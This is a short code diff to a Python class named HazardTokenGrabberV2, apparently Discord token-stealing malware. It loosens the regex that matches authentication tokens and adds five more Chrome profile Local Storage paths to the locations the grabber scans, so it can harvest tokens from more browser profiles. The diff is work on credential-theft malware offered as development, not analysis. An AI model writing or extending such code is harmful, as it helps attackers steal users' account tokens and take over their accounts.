@@ -58,7 +58,7 @@ class HazardTokenGrabberV2(Functions):
         self.chrome_user_data = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')
 
         self.chrome_reg = re.compile(r'(^profile\s\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE)
-        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
+        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
 
         self.sep = os.sep
@@ -153,6 +153,11 @@ class HazardTokenGrabberV2(Functions):
             'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
             'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
             'Chrome': self.chrome_user_data + '\\Default\\Local Storage\\leveldb\\',
+            'Chrome1': self.chrome_user_data + '\\Profile 1\\Local Storage\\leveldb\\',
+            'Chrome2': self.chrome_user_data + '\\Profile 2\\Local Storage\\leveldb\\',
+            'Chrome3': self.chrome_user_data + '\\Profile 3\\Local Storage\\leveldb\\',
+            'Chrome4': self.chrome_user_data + '\\Profile 4\\Local Storage\\leveldb\\',
+            'Chrome5': self.chrome_user_data + '\\Profile 5\\Local Storage\\leveldb\\',
             'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
             'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
             'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
